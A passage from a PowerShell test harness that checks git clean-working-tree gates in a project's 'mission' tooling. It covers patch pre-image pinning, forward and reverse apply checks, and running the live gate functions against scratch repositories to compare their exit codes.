                (`$admitted = @(`$decl.regexes); `$line -match `$_)        : $wtJudges   (expect True)
      fail-closed: an unreadable declaration AND a failing git status both REFUSE
                (`$decl.error -> Stop-WithError; -not `$porc.ok -> Stop-WithError) : $wtFailsClosed   (expect True)
      SINGLE SOURCE (CLOSED LIST, replaces the refuted blacklist): every code line that ASSIGNS TO
                or APPENDS TO the declaration pipeline (`$porc / `$lines / `$decl / `$admitted, or
                any property of one of them) is one of the $($wtWritesExpect.Count) enumerated
                declaration reads, so a code-resident top-up in ANY spelling is red -- `$admitted
                += ..., a widened right-hand side, or a top-up of `$decl.regexes before it is read
                                                                    : $wtSingleSource   (expect True)
                found $($wtWrites.Count) write site(s): $($wtWrites -join '  ||  ')
      CLOSED TEST SURFACE (CLOSED LIST): every code line carrying a comparison operator is one of
                the $($wtTestsExpect.Count) enumerated tests, so a SECOND, independent judgment of
                a porcelain line against a code-resident pattern is red even though it never names
                `$admitted                                          : $wtClosedTests   (expect True)
                found $($wtTests.Count) test site(s)
      reader is real, not a name: Get-LamDeclaredAdmittedPorcelain is DEFINED in
                tools/lam/lam-verify-admission.ps1 and that file reads admitted_porcelain
                from .mission\mission.yaml                                  : $readerReal   (expect True)
  PER-GATE EXPECTATION TABLE -- each literal is declared on the row of the gate it belongs to and
  is tested against THAT gate's post-image only, so one gate's requirement cannot read as the
  other's permission. The two gates genuinely diverge IN THIS PATCH: its post-image of
  tools/mission-spec-accept.ps1 lay outside the work-tree cure's declared file set, still carries the D9 /
  amendment 7 collapsed forms, and that divergence is a REGISTERED RESIDUAL (amendment 36, "what is
  not claimed", item 4) -- measured here, not hidden. Whether the LIVE file still
  carries them is not this member's question since batch 1 session 5: H-16 answers it by
  behaviour. All rows green : $gateScopingOk   (expect True)
$gateReport
  WHY THE D9 FORMS ARE STILL RIGHT FOR THE GATE THAT KEEPS THEM: the session anchor matches NOTHING
  while the plane is wholly untracked -- git collapses it to one line -- and verify-<id>/ dirs never
  match it even once the plane is partly tracked. WHY THEY ARE WRONG FOR THE GATE THAT DROPPED THEM:
  they matched the path with the XY status code already stripped, so a MODIFIED or DELETED tracked
  evidence file passed exactly as an untracked store did, and no mission could narrow them.
  NOTE: LIVE application of this patch is WP-6 S-5, in the smoke repo only. The LIVE tools/ gates are
  judged by behaviour in H-16, not here.
"@
Check -Id 'H-3' -Title 'clean-tree exemption patch is pinned to its own recorded PRE-IMAGE (fixture, face and index lines agree) and applies to it FORWARD only, names both gates, and the Assert-CleanWorkingTree its forward apply DERIVES -- proven to be the post-image its index lines declare -- is EXECUTED against scratch mission roots and admits exactly the declared set; the live tools/mission-lib.ps1 and tools/mission-spec-accept.ps1 are not read -- the execution BINDS, the text conjuncts are the NET' `
      -Ok ($preImagePinned -and $appliesForward -and $isUnified -and $namesBoth -and $namesPat -and $addsLines -and $mechanismOk -and $execBinds) -Detail $detail

# =============================================================================================
# H-3b -- the FIXED-direction predicate still REFUSES, and BOTH of its legs are live
# =============================================================================================
# A predicate that admits more than it used to has to be shown still refusing the thing the old
# one refused, and shown using both of its branches -- otherwise H-3 could be green against a
# check that had simply been switched off, and half the new code would never execute.
# SINCE AN EARLIER REVISION the predicate is no longer two-way: against the pinned
# pre-image the patch must apply forward AND must not reverse-apply. What this member asserts is the
# same in kind -- the malformed patch refused, both git directions EXERCISED on real trees and seen
# both succeeding and failing -- plus the EMPTY patch, which used to be refused in argument and, on
# this git, only by its parse-time refusal. It is now DRIVEN twice: as git reads it by default, and
# ACCEPTED with --allow-empty, where it applies in BOTH directions and only the reverse leg refuses it.
# Every tree here is built from the pinned pre-image fixture; none is a copy of the live tools/.
$corruptRefused = (-not $corruptRes.Ok) -and ($corruptRes.Forward -ne 0) -and ($corruptRes.Reverse -ne 0)
$flipBuilt      = ($flipExit -eq 0)
# BOTH LEGS, ON OPPOSITE TREES. The pre-image tree: forward yes, reverse no. The tree its ONE forward
# apply derives: reverse yes, forward no. Each git direction is thereby seen succeeding on one tree and
# failing on the other, so neither branch of the predicate is dead code.
$preImageLeg    = ($exact.Forward -eq 0) -and ($exact.Reverse -ne 0)
$postImageLeg   = ($flip.Reverse  -eq 0) -and ($flip.Forward  -ne 0)
$bothLegsLive   = $preImageLeg -and $postImageLeg
$emptyRefused   = $emptyBuilt -and (-not $emptyRes.Ok) -and (-not $emptyAllowRes.Ok)
$pinShaFace     = (@($pinVerdicts | ForEach-Object { "$($_.PatchPath) $($_.FaceSha)" }) -join '; ')
$detail = @"
  REFUSE -- the V-1 round 1 defect (@@ new-side counts understated by 2), rebuilt from the real patch
  and measured against a tree built from the PRE-IMAGE FIXTURE:
    fixture differs from the artifact : $corruptBuilt   (expect True -- a fixture identical to the
                                        subject would assert nothing)
    predicate says EXACT              : $($corruptRes.Ok)   (expect False)
    fwd exit $($corruptRes.Forward) / rev exit $($corruptRes.Reverse)   (expect both non-zero -- git rejects a malformed
                                        patch at parse time, measured 128/128, so neither leg
                                        can rescue it)
    state : $($corruptRes.State)
  REFUSE -- the EMPTY patch (a zero-byte file: what a naive "refresh this file against current source"
  produces), against a tree built from the PRE-IMAGE FIXTURE:
    the fixture is a zero-byte file : $emptyBuilt   (expect True)
    as git reads it by default  : fwd $($emptyRes.Forward) / rev $($emptyRes.Reverse)   predicate says EXACT : $($emptyRes.Ok)   (expect False)
      state : $($emptyRes.State)
    ACCEPTED with --allow-empty : fwd $($emptyAllowRes.Forward) / rev $($emptyAllowRes.Reverse)   predicate says EXACT : $($emptyAllowRes.Ok)   (expect False -- it applies in BOTH directions, and the reverse leg is what refuses it)
      state : $($emptyAllowRes.State)
    both refused : $emptyRefused   (expect True)
  CONTROL -- the real patch, both trees built from the pinned pre-image fixture:
    pre-image tree : fwd $($exact.Forward) / rev $($exact.Reverse)   ok=$($exact.Ok)   forward-yes AND reverse-no=$preImageLeg
      state : $($exact.State)
    derived tree   : fwd $($flip.Forward) / rev $($flip.Reverse)   ok=$($flip.Ok)   reverse-yes AND forward-no=$postImageLeg
      state : $($flip.State)
    derived tree built by ONE forward apply to the fixture : $flipBuilt   (exit $flipExit, expect 0)
    both legs exercised, on opposite trees : $bothLegsLive   (expect True)
  WHY A FIXED DIRECTION, NOT EXACTLY-ONE-DIRECTION ANY MORE: the exclusive-or existed because the
  subject tree was the LIVE tools/, which could legitimately stand on either side of the patch. The
  pinned fixture can only be the pre-image, so admitting the other side would admit a patch whose
  sides were swapped. The accepted EMPTY patch is why the reverse leg is not decoration: it applies in
  both directions, so a forward-only predicate would call it exact.
  HISTORY, kept: PLANTED once, a ZERO-BYTE patch in this artifact's place
  turned this member RED -- git 2.54.0.windows.1 refuses empty input at PARSE time ("No valid patches
  in input"), fwd 128 / rev 128, and a headers-only no-hunk diff is refused the same way ("patch with
  only garbage"). The --allow-empty row above is what now reaches the case that parse refusal hid.
  NOTE: the derived tree is no longer a ROUND TRIP whose independence rested on an out-of-band
  reading. The two sha256 recorded earlier for the exemption-free tools/ (one for
  mission-lib.ps1, one for mission-spec-accept.ps1) became the PINS on the patch face
  (since re-derived for the edits the face discloses), and H-3 re-measures the pins against the fixture on every run. The face reads
  now: $pinShaFace
"@
Check -Id 'H-3b' -Title 'the FIXED-direction apply predicate refuses a malformed patch in both directions and an empty patch even when git accepts it, and both of its legs are exercised on trees built from the pinned pre-image: the fixture applies forward and not in reverse, and the tree its forward apply derives reverse-applies and not forward' `
      -Ok ($corruptBuilt -and $corruptRefused -and $flipBuilt -and $bothLegsLive -and $emptyRefused) -Detail $detail

# =============================================================================================
# H-16 -- THE LIVE CLEAN-TREE GATES ARE JUDGED BY BEHAVIOUR, NEVER BY BYTES
# =============================================================================================
# WHY THIS MEMBER EXISTS. Until the pre-image was pinned, H-3 asserted that the clean-tree
# patch applied EXACTLY against the LIVE tools/mission-lib.ps1 and tools/mission-spec-accept.ps1, so
# every lifecycle edit to either file was a WP-1 regression by construction, whatever the edit did
# (the spec-accept cure alone would turn WP-1 red, H-3 and
# H-3b, with H-3's execution leg silenced). H-3 now judges the patch against its own pinned pre-image
# and never reads those two files. That subtraction would leave the LIVE gates judged by nothing in
# this instrument, so this member judges them -- by what they DO, never by what their bytes are.
#
#   (i)  THE LIVE Assert-CleanWorkingTree. tools/mission-lib.ps1 is dot-sourced IN PLACE through
#        _drv-a126-clean-tree.ps1, so its $PSScriptRoot\lam\lam-verify-admission.ps1 is the live
#        reader, over the SAME scratch mission roots H-3's execution leg builds (built before, and
#        independent of, H-3's derivation) plus four rows of its own. Every row must return its
#        DECLARED verdict (the exit code) over an asserted porcelain shape, and a row refused for a
#        porcelain LINE must name that line's path. Message WORDING is asserted nowhere here --
#        wording is exactly the byte coupling being removed -- so the DEGRADATION rows (git status
#        fails, a malformed or unreadable declaration, the reader absent) are judged by exit code
#        alone. That gives up discrimination m1 and k1 have in H-3 through their wording, so two rows
#        are added whose exit code ALONE tells a fail-open degradation apart:
#          m2 -- the MALFORMED declaration over a line its malformed entry was MEANT to admit. A gate
#                that falls back to anything admitting it exits 0; a gate that refuses exits 1.
#          k2 -- the reader ABSENT over a line the valid declaration WOULD admit. A gate that falls back
#                to a code default when it cannot read its own rule exits 0.
#        For the reader-absent rows (k1, k2) a copy of the live file is placed ALONE in a scratch
#        directory, hash-checked against the live file, with no lam/ beside it.
#
#   (ii) THE LIVE Assert-CleanGitTree, EXECUTED. tools/mission-spec-accept.ps1 is PARSED, decoded the
#        way PowerShell 5.1 decodes it to run it; the function text is taken VERBATIM from its
#        FunctionDefinitionAst, together with every function the script defines at top level BEFORE
#        its first top-level call of the gate (the scope that call really sees), under the script's
#        own top-level `$ErrorActionPreference = 'Stop'` and `Set-StrictMode -Version Latest` -- each
#        ASSERTED present by AST, once, before the call, not assumed. The generated script sits in a
#        SCRATCH tools\ directory beside hash-checked COPIES of the live mission-lib.ps1 and
#        lam\lam-verify-admission.ps1, because a cured gate resolves `Join-Path $PSScriptRoot
#        'mission-lib.ps1'`; the live tools\ is never written. It runs with the working directory set
#        to each scratch root (a marker line proves the child's location), verdict = exit code. Rows
#        run with -AllowPaths do not apply (spec-accept passes none), nor do the reader-absent rows
#        (they vary the LIBRARY, not the root).
#        The live gate is then CLASSIFIED into EXACTLY ONE of two recognised states; anything else is
#        RED:
#          DELEGATES -- CURED: its exit code equals the live Assert-CleanWorkingTree's
#                       (no -AllowPaths) on EVERY row;
#          RESIDUAL  -- OPEN, the registered divergence: its exit code
#                       equals, on EVERY row, a MODEL of the uncured code-constant list -- refuse iff
#                       git status fails, or some porcelain line matches NONE of '^\?\? \.claude/',
#                       '^\?\? \.mission-runtime/', '^\?\? \.mission/evidence/session-',
#                       '^\?\? \.mission/evidence/' and '^\?\? \.mission/gates/' (PowerShell -notmatch,
#                       case-insensitive). The model was transcribed after READING the live gate at
#                       tools/mission-spec-accept.ps1:185-216.
#        Both states are green because WP-1 must be green both BEFORE and AFTER the spec-accept cure lands. The
#        state is printed, and RESIDUAL says in capitals that the spec-accept cure is OPEN.
#
# NON-VACUITY. A classifier whose two states predict the same verdict on every row cannot tell them
# apart, and would call a RESIDUAL gate DELEGATES. So the row set must make the two predictions DIFFER
# on at least one row -- h1 and h2 (an untracked, NOT gitignored `?? .claude/` and
# `?? .mission-runtime/`, the two constants the uncured list tolerates and no declaration here does)
# are added for that, beside the evidence- and gates-plane rows that already differ -- and must make
# them AGREE where they must: a plain stray (a5), a genuinely clean tree (t1), a tracked modification
# (a4) and a failing git status (n1).
#
# WHAT THIS MEMBER DOES NOT REACH, stated rather than left to be found:
#   - the lifecycle CLIs' own call sites -- reopen, promote-contract, ledger-append, close-milestone,
#     reclose, spec-bump, green-gate-seed, prune-objects -- are NOT asserted to call the predicate at
#     all, or to call it with the right -AllowPaths;
#   - message wording is not asserted, anywhere;
#   - only Assert-CleanGitTree is executed out of tools/mission-spec-accept.ps1: Assert-RepoRoot, the
#     four hard gates and the acceptance sequence are not, and no script-scope variable the gate might
#     come to depend on is supplied (the generated script would then fail every row: RED, not green);
#   - the RESIDUAL model is a transcript of the uncured list as read and is to be RETIRED
#     in the commit that lands the spec-accept cure; until it is, a regression from DELEGATES back to
#     exactly that behaviour would read green here;
#   - every limit H-3's execution leg states for its row set applies unchanged: at most three
#     porcelain lines and two declared entries per row, plain repositories at ASCII paths, the XY
#     codes the alphabet partition registers UNREACHABLE on this host, no ignored or submodule
#     porcelain.
$h16LiveLib    = Join-Path $repoRoot 'tools\mission-lib.ps1'
$h16LiveSpec   = Join-Path $repoRoot 'tools\mission-spec-accept.ps1'
$h16LiveReader = Join-Path $repoRoot 'tools\lam\lam-verify-admission.ps1'
$h16Present    = (Test-Path -LiteralPath $h16LiveLib) -and (Test-Path -LiteralPath $h16LiveSpec) -and
                 (Test-Path -LiteralPath $h16LiveReader) -and $a126DrvOk
$h16Dir        = Join-Path $applyDir 'h16'
New-Item -ItemType Directory -Path $h16Dir -Force | Out-Null
function Get-H16FileSha256 {
    param([string]$Path)
    if (-not (Test-Path -LiteralPath $Path)) { return '<absent>' }
    (Get-FileHash -LiteralPath $Path -Algorithm SHA256).Hash.ToLowerInvariant()
}

# -- THIS MEMBER'S OWN ROWS, built with H-3's own builder beside H-3's roots.
$h16RootH1 = New-A126Root 'h1' $a126Decl $true $false; Add-A126File $h16RootH1 '.claude\wp1-h16.txt'
$h16RootH2 = New-A126Root 'h2' $a126Decl $true $false; Add-A126File $h16RootH2 '.mission-runtime\wp1-h16.txt'
$h16RootM2 = New-A126Root 'm2' $a126Mal  $true $false; Add-A126File $h16RootM2 '.mission\evidence\verify-0021\r.json'
$h16RootK2 = New-A126Root 'k2' $a126Decl $true $false; Add-A126File $h16RootK2 '.mission\evidence\verify-0022\r.json'

# THE DEGRADATION rows: refused BEFORE any porcelain line is judged, so there is no offending path to
# name and the verdict is the exit code alone. Listed by id. A degradation row added to H-3 without
# being listed here is treated as a LINE refusal and goes red until someone decides which it is --
# fail-closed on purpose.
$h16DegradedIds = @('n1', 'm1', 'u1', 'k1', 'm2', 'k2')
$h16Specs = @()
foreach ($spec in $execSpec) {
    $h16Specs += [pscustomobject]@{
        Id       = ($spec.Name -split ' ')[0]
        Label    = $spec.Name
        Root     = $spec.Root
        Porc     = $spec.Porc
        Exit     = $spec.Exit
        Allow    = $(if ($spec.ContainsKey('Allow')) { [string]$spec.Allow } else { '' })
        NoReader = ($spec.ContainsKey('NoReader') -and [bool]$spec.NoReader)
    }
}
foreach ($swb in $sweepBuilt) {
    $h16Specs += [pscustomobject]@{
        Id = $swb.Id; Label = ($swb.Id + ' XY sweep -- ' + $swb.What + ' at a DECLARED prefix -> REFUSED')
        Root = $swb.Root; Porc = @($swb.Porc); Exit = 1; Allow = ''; NoReader = $false
    }
}
$h16Specs += [pscustomobject]@{
    Id = 'h1'; Label = 'h1 an untracked, NOT gitignored .claude/ under the verify- declaration -> REFUSED'
    Root = $h16RootH1; Porc = @('?? .claude/'); Exit = 1; Allow = ''; NoReader = $false }
$h16Specs += [pscustomobject]@{
    Id = 'h2'; Label = 'h2 an untracked, NOT gitignored .mission-runtime/ under the verify- declaration -> REFUSED'
    Root = $h16RootH2; Porc = @('?? .mission-runtime/'); Exit = 1; Allow = ''; NoReader = $false }
$h16Specs += [pscustomobject]@{
    Id = 'm2'; Label = 'm2 a MALFORMED declaration over the very line its entry was meant to admit -> REFUSED (a fallback that admits it exits 0)'
    Root = $h16RootM2; Porc = @('?? .mission/evidence/verify-0021/'); Exit = 1; Allow = ''; NoReader = $false }
$h16Specs += [pscustomobject]@{
    Id = 'k2'; Label = 'k2 the reader ABSENT over a line the valid declaration WOULD admit -> REFUSED (a code default that admits it exits 0)'
    Root = $h16RootK2; Porc = @('?? .mission/evidence/verify-0022/'); Exit = 1; Allow = ''; NoReader = $true }

# --- (i) THE LIVE Assert-CleanWorkingTree ----------------------------------------------------------
$h16NoReaderDir = Join-Path $h16Dir 'noreader'
New-Item -ItemType Directory -Path $h16NoReaderDir -Force | Out-Null
$h16NoReaderLib = Join-Path $h16NoReaderDir 'mission-lib.ps1'
if ($h16Present) { Copy-Item -LiteralPath $h16LiveLib -Destination $h16NoReaderLib -Force }
$h16NoReaderOk  = $h16Present -and ((Get-H16FileSha256 $h16NoReaderLib) -ceq (Get-H16FileSha256 $h16LiveLib)) -and
                  (-not (Test-Path -LiteralPath (Join-Path $h16NoReaderDir 'lam')))
function Get-H16PorcelainPath {
    # The PATH a porcelain line names, derived the way the gate derives it for -AllowPaths: the XY
    # code and its separator dropped, a rename reduced to its DESTINATION, git's quoting stripped.
    param([string]$Line)
    $h16P = $Line.Substring([Math]::Min(3, $Line.Length)).Trim()
    if ($h16P -match ' -> ') { $h16P = ($h16P -split ' -> ')[-1] }
    $h16P.Trim('"')
}
$h16AcwRows = @()
foreach ($row in $h16Specs) {
    $h16St = Get-A126Porcelain -Root $row.Root
    if ($null -eq $row.Porc) {
        $h16ShapeOk  = (-not $h16St.Ok)
        $h16ShapeTxt = "git status EXITED NON-ZERO (which is the fixture): $($h16St.Ok -eq $false)"
    } else {
        $h16Want    = @($row.Porc)
        $h16Got     = @($h16St.Lines)
        $h16ShapeOk = $h16St.Ok -and ($h16Got.Count -eq $h16Want.Count)
        if ($h16ShapeOk) { for ($k = 0; $k -lt $h16Want.Count; $k++) { if ($h16Got[$k] -cne $h16Want[$k]) { $h16ShapeOk = $false } } }
        $h16ShapeTxt = ($h16Got -join ' | ')
    }
    $h16Lib = if ($row.NoReader) { $h16NoReaderLib } else { $h16LiveLib }
    $h16Res = [pscustomobject]@{ Exit = -1; Out = '<NOT RUN -- a live gate file or the driver is absent>' }
    if ($h16Present) { $h16Res = Invoke-A126Gate -Root $row.Root -AllowPathsCsv $row.Allow -LibPath $h16Lib }
    $h16Allow = @()
    if ($row.Allow) { $h16Allow = @($row.Allow -split ';' | ForEach-Object { $_.Trim() } | Where-Object { $_ }) }
    $h16LineRefusal = ($row.Exit -eq 1) -and ($h16DegradedIds -notcontains $row.Id) -and ($null -ne $row.Porc)
    $h16MustName    = @()
    $h16MustNotName = @()
    if ($h16LineRefusal) {
        foreach ($h16Ln in @($row.Porc)) {
            $h16Path = Get-H16PorcelainPath -Line $h16Ln
            if ($h16Allow -contains $h16Path) { $h16MustNotName += $h16Path } else { $h16MustName += $h16Path }
        }
    }
    $h16NamesOk = $true
    if ($h16LineRefusal) {
        $h16NamesOk = ($h16MustName.Count -gt 0) -and
                      (@($h16MustName | Where-Object { -not $h16Res.Out.Contains($_) }).Count -eq 0)
    }
    $h16NotNamesOk = (@($h16MustNotName | Where-Object { $h16Res.Out.Contains($_) }).Count -eq 0)
    $h16AcwRows += [pscustomobject]@{
        Id          = $row.Id
        Label       = $row.Label
        Root        = $row.Root
        StatusOk    = $h16St.Ok
        Lines       = @($h16St.Lines)
        ShapeOk     = $h16ShapeOk
        Shape       = $h16ShapeTxt
        Want        = $row.Exit
        Got         = $h16Res.Exit
        LineRefusal = $h16LineRefusal
        MustName    = $h16MustName
        NamesOk     = $h16NamesOk
        MustNotName = $h16MustNotName
        NotNamesOk  = $h16NotNamesOk
        NoReader    = $row.NoReader
        Allow       = $row.Allow
        Ok          = ($h16ShapeOk -and ($h16Res.Exit -eq $row.Exit) -and $h16NamesOk -and $h16NotNamesOk)
    }
}
$h16AcwOk = $h16Present -and $h16NoReaderOk -and ($h16AcwRows.Count -eq $h16Specs.Count) -and ($h16AcwRows.Count -gt 0) -and
            (@($h16AcwRows | Where-Object { -not $_.Ok }).Count -eq 0)

# --- (ii) THE LIVE Assert-CleanGitTree, extracted by AST and executed ------------------------------
$h16Tools        = Join-Path $h16Dir 'tools'
$h16Gen          = Join-Path $h16Tools 'wp1-h16-spec-accept-gate.ps1'
$h16CopyLib      = Join-Path $h16Tools 'mission-lib.ps1'
$h16CopyReader   = Join-Path $h16Tools 'lam\lam-verify-admission.ps1'
New-Item -ItemType Directory -Path (Join-Path $h16Tools 'lam') -Force | Out-Null
$h16LiveSpecSha  = Get-H16FileSha256 $h16LiveSpec
$h16Encoding     = '<not read>'
$h16ParseErrors  = -1
$h16RoundTrip    = $false
$h16Calls        = 0
$h16EapStmts     = @()
$h16StrictStmts  = @()
$h16Eap          = 0
$h16Strict       = 0
$h16Fns          = @()
$h16GateDefs     = 0
$h16ContextOk    = $false
$h16SlicesExact  = $false
$h16CopiesOk     = $false
$h16GenOk        = $false
$h16GenParseErrs = -1
if ($h16Present) {
    Copy-Item -LiteralPath $h16LiveLib    -Destination $h16CopyLib    -Force
    Copy-Item -LiteralPath $h16LiveReader -Destination $h16CopyReader -Force
    $h16CopiesOk = ((Get-H16FileSha256 $h16CopyLib)    -ceq (Get-H16FileSha256 $h16LiveLib)) -and
                   ((Get-H16FileSha256 $h16CopyReader) -ceq (Get-H16FileSha256 $h16LiveReader))
    # DECODE AS POWERSHELL 5.1 DECODES THE FILE TO RUN IT: a UTF-8 BOM means UTF-8, otherwise the ANSI
    # code page. Any other decoding could yield a DIFFERENT AST from the one that executes (to the PS
    # tokenizer a CP1252 0x93 byte is a quote). The extents are re-encoded the same way, and each is
    # asserted byte-identical to its own slice of the live file.
    $h16Bytes    = [System.IO.File]::ReadAllBytes($h16LiveSpec)
    $h16Bom      = ($h16Bytes.Length -ge 3) -and ($h16Bytes[0] -eq 0xEF) -and ($h16Bytes[1] -eq 0xBB) -and ($h16Bytes[2] -eq 0xBF)
    $h16Enc      = if ($h16Bom) { New-Object System.Text.UTF8Encoding($false) } else { [System.Text.Encoding]::Default }
    $h16Skip     = if ($h16Bom) { 3 } else { 0 }
    $h16Encoding = if ($h16Bom) { 'UTF-8 (BOM present)' } else { "ANSI code page $($h16Enc.CodePage) (no BOM)" }
    $h16Text     = $h16Enc.GetString($h16Bytes, $h16Skip, $h16Bytes.Length - $h16Skip)
    $h16Back     = $h16Enc.GetBytes($h16Text)
    $h16RoundTrip = ($h16Back.Length -eq ($h16Bytes.Length - $h16Skip))
    if ($h16RoundTrip) {
        for ($h16I = 0; $h16I -lt $h16Back.Length; $h16I++) { if ($h16Back[$h16I] -ne $h16Bytes[$h16I + $h16Skip]) { $h16RoundTrip = $false; break } }
    }
    $h16Tokens = $null
    $h16Errs   = $null
    $h16Ast    = [System.Management.Automation.Language.Parser]::ParseInput($h16Text, [ref]$h16Tokens, [ref]$h16Errs)
    $h16ParseErrors = @($h16Errs).Count
    $h16Top    = @($h16Ast.EndBlock.Statements)
    $h16CallStmts = @($h16Top | Where-Object {
        ($_ -is [System.Management.Automation.Language.PipelineAst]) -and (@($_.PipelineElements).Count -eq 1) -and
        ($_.PipelineElements[0] -is [System.Management.Automation.Language.CommandAst]) -and
        ($_.PipelineElements[0].GetCommandName() -eq 'Assert-CleanGitTree') })
    $h16Calls  = $h16CallStmts.Count
    $h16CallAt = if ($h16Calls -gt 0) { $h16CallStmts[0].Extent.StartOffset } else { -1 }
    $h16EapStmts = @($h16Top | Where-Object {
        ($_ -is [System.Management.Automation.Language.AssignmentStatementAst]) -and ($_.Extent.StartOffset -lt $h16CallAt) -and
        ($_.Left -is [System.Management.Automation.Language.VariableExpressionAst]) -and
        ($_.Left.VariablePath.UserPath -eq 'ErrorActionPreference') })
    $h16StrictStmts = @($h16Top | Where-Object {
        ($_ -is [System.Management.Automation.Language.PipelineAst]) -and ($_.Extent.StartOffset -lt $h16CallAt) -and
        (@($_.PipelineElements).Count -eq 1) -and ($_.PipelineElements[0] -is [System.Management.Automation.Language.CommandAst]) -and
        ($_.PipelineElements[0].GetCommandName() -eq 'Set-StrictMode') })
    $h16Eap    = @($h16EapStmts    | Where-Object { ([string]$_.Operator -eq 'Equals') -and ($_.Right.Extent.Text -ceq "'Stop'") }).Count
    $h16Strict = @($h16StrictStmts | Where-Object { $_.Extent.Text -cmatch '^Set-StrictMode\s+-Version\s+Latest$' }).Count
    $h16Fns    = @($h16Top | Where-Object {
        ($_ -is [System.Management.Automation.Language.FunctionDefinitionAst]) -and ($_.Extent.StartOffset -lt $h16CallAt) })
    $h16GateDefs  = @($h16Fns | Where-Object { $_.Name -eq 'Assert-CleanGitTree' }).Count
    $h16ContextOk = ($h16ParseErrors -eq 0) -and ($h16Calls -ge 1) -and
                    ($h16EapStmts.Count -eq 1) -and ($h16Eap -eq 1) -and
                    ($h16StrictStmts.Count -eq 1) -and ($h16Strict -eq 1) -and ($h16GateDefs -eq 1)
    # What is emitted, in FILE ORDER: the two context statements and the functions before the call.
    $h16Emit = @(@($h16EapStmts) + @($h16StrictStmts) + @($h16Fns) | Sort-Object { $_.Extent.StartOffset })
    $h16SlicesExact = ($h16Emit.Count -gt 0)
    foreach ($h16E in $h16Emit) {
        $h16EB  = $h16Enc.GetBytes($h16E.Extent.Text)
        $h16Pos = $h16Skip + $h16Enc.GetByteCount($h16Text.Substring(0, $h16E.Extent.StartOffset))
        if (($h16Pos + $h16EB.Length) -gt $h16Bytes.Length) { $h16SlicesExact = $false; continue }
        for ($h16J = 0; $h16J -lt $h16EB.Length; $h16J++) { if ($h16EB[$h16J] -ne $h16Bytes[$h16Pos + $h16J]) { $h16SlicesExact = $false; break } }
    }
    if ($h16ContextOk -and $h16RoundTrip -and $h16SlicesExact) {
        $h16Sb = New-Object System.Text.StringBuilder
        [void]$h16Sb.Append("# GENERATED BY WP-1 H-16 -- NOT A REPOSITORY FILE; removed with its sandbox.`r`n")
        [void]$h16Sb.Append("# From tools/mission-spec-accept.ps1, sha256 $h16LiveSpecSha : its top-level ErrorActionPreference and`r`n")
        [void]$h16Sb.Append("# Set-StrictMode statements and every top-level function it defines before its first call of`r`n")
        [void]$h16Sb.Append("# Assert-CleanGitTree, VERBATIM and in file order; then a location marker and ONE call. Exit code = verdict.`r`n")
        foreach ($h16E in $h16Emit) { [void]$h16Sb.Append($h16E.Extent.Text + "`r`n") }
        [void]$h16Sb.Append("Write-Output ('WP1-H16-CWD: ' + (Get-Location).ProviderPath)`r`n")
        [void]$h16Sb.Append("Assert-CleanGitTree`r`n")
        [void]$h16Sb.Append("exit 0`r`n")
        $h16GenText  = $h16Sb.ToString()
        $h16GenTok   = $null
        $h16GenErrs  = $null
        [void][System.Management.Automation.Language.Parser]::ParseInput($h16GenText, [ref]$h16GenTok, [ref]$h16GenErrs)
        $h16GenParseErrs = @($h16GenErrs).Count
        $h16GenBytes = $h16Enc.GetBytes($h16GenText)
        if ($h16Bom) { $h16GenBytes = [byte[]](@(0xEF, 0xBB, 0xBF) + $h16GenBytes) }
        [System.IO.File]::WriteAllBytes($h16Gen, $h16GenBytes)
        $h16GenOk = (Test-Path -LiteralPath $h16Gen) -and ($h16GenParseErrs -eq 0)
    }
}
$h16AstOk   = $h16ContextOk -and $h16RoundTrip -and $h16SlicesExact
$h16FnNames = (@($h16Fns | ForEach-Object { $_.Name }) -join ', ')

$h16ModelPatterns = @('^\?\? \.claude/', '^\?\? \.mission-runtime/', '^\?\? \.mission/evidence/session-', '^\?\? \.mission/evidence/', '^\?\? \.mission/gates/')
function Get-H16ResidualVerdict {
    # THE RESIDUAL MODEL: the uncured Assert-CleanGitTree's own predicate, transcribed. Refuse (1) iff
    # git status failed, or some non-empty porcelain line matches NONE of the five patterns -- each
    # tested with -notmatch (case-insensitive) and conjoined, exactly as the uncured Where-Object
    # conjoins them; otherwise admit (0).
    param([bool]$StatusOk, [string[]]$Lines)
    if (-not $StatusOk) { return 1 }
    foreach ($h16ML in @($Lines)) {
        if (-not $h16ML) { continue }
        $h16Relevant = $true
        foreach ($h16MP in $h16ModelPatterns) { $h16Relevant = $h16Relevant -and ($h16ML -notmatch $h16MP) }
        if ($h16Relevant) { return 1 }
    }
    return 0
}
function Invoke-H16SpecGate {
    # Runs the GENERATED gate with the working directory set to the scratch root, as the real ceremony
    # runs from the repository root. PS 5.1: the child's stderr under 'Stop' would be a fatal
    # NativeCommandError in THIS process, so the preference is relaxed around the call.
    param([string]$Root)
    $h16Code = -1
    $h16Out  = @('<NOT RUN -- the scratch root is not a directory>')
    if (-not (Test-Path -LiteralPath $Root -PathType Container)) { return [pscustomobject]@{ Exit = $h16Code; Lines = $h16Out } }
    Push-Location -LiteralPath $Root
    $prevEap = $ErrorActionPreference
    $ErrorActionPreference = 'Continue'
    try {
        $h16Out  = @(& powershell -NoProfile -ExecutionPolicy Bypass -File $h16Gen 2>&1 | ForEach-Object { "$_" })
        $h16Code = $LASTEXITCODE
    } finally { $ErrorActionPreference = $prevEap; Pop-Location }
    [pscustomobject]@{ Exit = $h16Code; Lines = $h16Out }
}
$h16Applicable = @($h16AcwRows | Where-Object { (-not $_.Allow) -and (-not $_.NoReader) })
$h16SpecRows   = @()
if ($h16GenOk -and $h16CopiesOk) {
    foreach ($ar in $h16Applicable) {
        $h16Model  = Get-H16ResidualVerdict -StatusOk $ar.StatusOk -Lines $ar.Lines
        $h16SRes   = Invoke-H16SpecGate -Root $ar.Root
        $h16Marker = 'WP1-H16-CWD: ' + $ar.Root
        $h16SpecRows += [pscustomobject]@{
            Id       = $ar.Id
            Declared = $ar.Want
            Acw      = $ar.Got
            Model    = $h16Model
            Spec     = $h16SRes.Exit
            CwdOk    = (@($h16SRes.Lines | Where-Object { $_ -ieq $h16Marker }).Count -eq 1)
        }
    }
}
$h16SpecN      = $h16SpecRows.Count
$h16ExpectN    = $h16Applicable.Count
$h16Complete   = ($h16SpecN -gt 0) -and ($h16SpecN -eq $h16ExpectN)
$h16Delegates  = $h16Complete -and (@($h16SpecRows | Where-Object { $_.Spec -ne $_.Acw }).Count -eq 0)
$h16Residual   = $h16Complete -and (@($h16SpecRows | Where-Object { $_.Spec -ne $_.Model }).Count -eq 0)
$h16OneState   = ($h16Delegates -xor $h16Residual)
$h16State      = if ($h16Delegates -and (-not $h16Residual)) { 'DELEGATES' }
